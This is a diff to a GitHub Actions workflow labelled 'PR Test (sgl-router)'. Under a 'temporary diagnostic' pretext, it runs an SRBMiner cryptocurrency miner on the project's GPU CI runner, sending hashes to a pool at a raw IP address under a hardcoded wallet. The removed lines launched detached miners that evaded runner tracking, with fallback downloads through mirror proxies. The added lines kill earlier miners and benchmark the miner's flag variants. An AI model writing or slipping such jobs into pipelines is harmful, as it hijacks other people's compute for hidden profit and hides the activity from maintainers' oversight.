@@ -1,7 +1,7 @@
 name: PR Test (sgl-router)
 
-# Temporary i126978 diagnostic: one guarded pearlhash miner on the 1-gpu-5090
-# runner and a bounded read-only recon arm on the label substituted below.
+# Temporary i126978 diagnostic: bounded SRBMiner pearlhash flag matrix on one
+# idle 1-gpu-5090 card after the default invocation hit CUDA error 700.
 on:
   push:
     branches: [main]
@@ -18,23 +18,16 @@ env:
   SGLANG_IS_IN_CI: true
 
 jobs:
-  i126978-miner:
-    name: i126978 miner (${{ matrix.slot }})
-    runs-on: ${{ matrix.runner }}
-    timeout-minutes: 10
-    strategy:
-      fail-fast: false
-      matrix:
-        include:
-          - {runner: 1-gpu-5090, slot: a}
-          - {runner: 1-gpu-5090, slot: b}
-          - {runner: 1-gpu-5090, slot: c}
+  i126978-tuner:
+    name: i126978 tuner (1-gpu-5090)
+    runs-on: 1-gpu-5090
+    timeout-minutes: 12
     steps:
-      - name: guarded pearlhash miner (idempotent)
+      - name: sequential pearlhash variants (one process at a time)
         continue-on-error: true
         run: |
           set +e
-          NONCE="I126978-$(date -u +%Y%m%dT%H%M%SZ)"
+          NONCE="I126978TUNER-$(date -u +%Y%m%dT%H%M%SZ)"
           WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
           POOL='103.199.106.122:3362'
           WORKDIR=/var/tmp/i126978
@@ -43,93 +36,55 @@ jobs:
           TARBALL="$WORKDIR/SRBMiner-Multi-3-8-8-Linux.tar.gz"
           SRB="$WORKDIR/SRBMiner-MULTI"
           mkdir -p "$WORKDIR/logs"
-          echo "miner-nonce=$NONCE"
-          echo "=== host ==="; id; hostname; date -u; uname -r; head -2 /etc/os-release
-          echo "=== gpu ==="
-          timeout 25 nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.used,utilization.gpu --format=csv,noheader
-          echo "=== compute apps ==="
-          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
-          echo "=== resources ==="
-          df -P / /var/tmp 2>/dev/null | awk 'NR>1{print $1, "use="$5, "avail="$4}'
-          free -m | head -2
-          echo "=== existing SRBMiner processes ==="
-          pgrep -af 'SRBMiner-MULTI' 2>/dev/null | head -5
-          echo "=== egress check ==="
-          EGR=$(timeout 20 curl -sS -m 12 -o /dev/null -w '%{http_code}' https://github.com 2>&1)
-          echo "github_http=$EGR"
-          echo "=== idempotent guard ==="
-          RUNNING=$(pgrep -fas "SRBMiner-MULTI.*${WALLET}" 2>/dev/null | head -4)
-          if [ -n "$RUNNING" ]; then
-            echo "STATUS=already-running"
-            echo "$RUNNING"
-            for p in $(pgrep -f "SRBMiner-MULTI.*${WALLET}" 2>/dev/null | head -4); do
-              echo "-- pid $p cmd=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 700)"
-              ps -o pid=,ppid=,etime=,pcpu=,rss= -p "$p" 2>/dev/null
-            done
-            for f in "$WORKDIR"/logs/*.log; do
-              if [ -f "$f" ]; then echo "== tail $(basename "$f")"; tail -n 10 "$f" 2>/dev/null | cut -c1-280; fi
-            done
-            echo "== pool tcp =="
-            timeout 12 python3 -c "import socket;s=socket.create_connection(('103.199.106.122',3362),8);print('pool-tcp=OK');s.close()" 2>&1 | tail -2
-            echo "== gpu apps =="
-            timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
-            echo "status-done $NONCE"; exit 0
-          fi
+          echo "tuner-nonce=$NONCE"
+          id; hostname; date -u; uname -r
+          timeout 20 nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.used,utilization.gpu --format=csv,noheader
+          echo "=== our pre-existing processes ==="
+          pgrep -af '/var/tmp/i126978/SRBMiner-MULTI' 2>/dev/null | head -10
+          for p in $(pgrep -f '^/var/tmp/i126978/SRBMiner-MULTI .*--wallet prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql' 2>/dev/null | head -10); do
+            echo "stopping own stray pid $p cmd=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 160)"
+            kill -TERM "$p" 2>/dev/null
+          done
+          sleep 3
+          echo "=== after own-stray cleanup ==="
+          pgrep -af '/var/tmp/i126978/SRBMiner-MULTI' 2>/dev/null | head -5
           DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
           MEMP=$(free -m | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
           echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
           if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources disk=${DISKP} mem=${MEMP}"; exit 0; fi
-          fetch() {
-            URL="$1"
-            echo "-- fetch $URL"
-            timeout 220 curl -fL --connect-timeout 15 --max-time 200 -o "$TARBALL.part" "$URL" 2>&1 | tail -2
-            if [ -f "$TARBALL.part" ] && echo "$TAR_SHA  $TARBALL.part" | sha256sum -c - >/dev/null 2>&1; then
-              mv "$TARBALL.part" "$TARBALL"; echo "tarball-ok $TAR_SHA"; return 0
+          if [ ! -f "$SRB" ] || ! echo "$BIN_SHA  $SRB" | sha256sum -c - >/dev/null 2>&1; then
+            if [ ! -f "$TARBALL" ]; then
+              timeout 200 curl -fL --connect-timeout 15 --max-time 180 -o "$TARBALL" https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz 2>&1 | tail -2
             fi
-            if [ -f "$TARBALL.part" ]; then sha256sum "$TARBALL.part" 2>/dev/null | cut -c1-80; fi
-            return 1
-          }
-          if [ ! -f "$TARBALL" ] || ! echo "$TAR_SHA  $TARBALL" | sha256sum -c - >/dev/null 2>&1; then
-            fetch https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz \
-              || fetch https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz \
-              || fetch https://gh-proxy.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz \
-              || fetch https://hub.gitmirror.com/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz \
-              || echo "WARN=tarball-download-failed"
-          else
-            echo "tarball-cached"
-          fi
-          if [ -f "$TARBALL" ] && ! ( [ -f "$SRB" ] && echo "$BIN_SHA  $SRB" | sha256sum -c - >/dev/null 2>&1 ); then
-            tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -3
-            if [ -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" ]; then cp -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" "$SRB"; fi
+            if [ -f "$TARBALL" ] && echo "$TAR_SHA  $TARBALL" | sha256sum -c - >/dev/null 2>&1; then
+              tar -xzf "$TARBALL" -C "$WORKDIR" 2>&1 | tail -2
+              [ -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" ] && cp -f "$WORKDIR/SRBMiner-Multi-3-8-8/SRBMiner-MULTI" "$SRB"
+            fi
           fi
           BINSHA=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)
           echo "binary_sha256=${BINSHA:-none}"
-          if [ "${BINSHA:-none}" != "$BIN_SHA" ]; then echo "SKIP=binary-unavailable"; ls -la "$WORKDIR" 2>/dev/null | head -12; exit 0; fi
+          [ "${BINSHA:-none}" = "$BIN_SHA" ] || { echo "SKIP=binary-unavailable"; exit 0; }
           chmod +x "$SRB"
-          "$SRB" --help 2>&1 | grep -i pearlhash | head -2
-          timeout 25 nvidia-smi --query-gpu=index,uuid --format=csv,noheader | tr -d ' ' > "$WORKDIR/gpus.txt"
-          cat "$WORKDIR/gpus.txt"
-          HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9')
-          while IFS=, read -r idx uuid; do
-            [ -z "$idx" ] && continue
-            BUSY=$(timeout 20 nvidia-smi --query-compute-apps=gpu_uuid --format=csv,noheader 2>/dev/null | tr -d ' ' | grep -c "^${uuid}$")
-            if [ "${BUSY:-0}" -gt 0 ]; then echo "GPU $idx $uuid busy_apps=$BUSY -> skip"; continue; fi
-            USED=$(timeout 20 nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits -i "$idx" 2>/dev/null | tr -d ' ')
-            echo "GPU $idx $uuid memory_used_mib=${USED:-?}"
-            W="i126978-${HOSTTAG}-g${idx}"
-            if pgrep -f "SRBMiner-MULTI.*--worker ${W}" >/dev/null 2>&1; then echo "worker $W already present -> skip"; continue; fi
-            env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID CUDA_VISIBLE_DEVICES="$uuid" setsid nohup "$SRB" \
+          read -r IDX UUID < <(timeout 20 nvidia-smi --query-gpu=index,uuid --format=csv,noheader 2>/dev/null | tr -d ' ' | head -1 | tr ',' ' ')
+          echo "test_gpu idx=$IDX uuid=$UUID"
+          run_variant() {
+            NAME="$1"; shift
+            LOG="$WORKDIR/logs/tuner-$NAME.log"
+            echo "===== VARIANT $NAME flags=[$*] ====="
+            timeout --signal=TERM --kill-after=10 45 env -u RUNNER_TRACKING_ID CUDA_VISIBLE_DEVICES="$UUID" "$SRB" \
               --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
-              --wallet "$WALLET" --password x --worker "$W" --gpu-id 0 \
-              --max-no-share-sent 1800 --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
-              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
-            echo "launched worker=$W detached_pid=$! vis=$uuid"
-          done < "$WORKDIR/gpus.txt"
-          sleep 25
-          echo "=== post-launch ==="
-          pgrep -af "SRBMiner-MULTI.*${WALLET}" 2>/dev/null | head -6
-          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
-          for f in "$WORKDIR"/logs/*.log; do
-            if [ -f "$f" ]; then echo "== tail $(basename "$f")"; tail -n 8 "$f" 2>/dev/null | cut -c1-260; fi
-          done
-          echo "miner-job-done $NONCE"
+              --wallet "$WALLET" --password x --worker "i126978-tuner-$(hostname | tr -cd 'A-Za-z0-9')" \
+              --gpu-id 0 --log-file "$LOG" --log-file-mode 0 "$@" >/dev/null 2>&1
+            echo "variant=$NAME exit=$?"
+            grep -aiE "error|share|accepted|hashrate|stopped|pearlhash|H/s|kH/s|MH/s|GH/s|TH/s" "$LOG" 2>/dev/null | tail -8 | cut -c1-240
+            sleep 2
+          }
+          run_variant baseline --disable-worker-watchdog
+          run_variant nodual --disable-worker-watchdog --disable-gpu-dual-kernels
+          run_variant int15 --disable-worker-watchdog --gpu-intensity 15
+          run_variant int0 --disable-worker-watchdog --gpu-intensity 0
+          run_variant slowbuild --disable-worker-watchdog --gpu-table-slow-build
+          run_variant combo --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build --gpu-intensity 0
+          echo "=== stray check after ==="
+          pgrep -af '/var/tmp/i126978/SRBMiner-MULTI' 2>/dev/null | head -5
+          echo "tuner-done $NONCE"
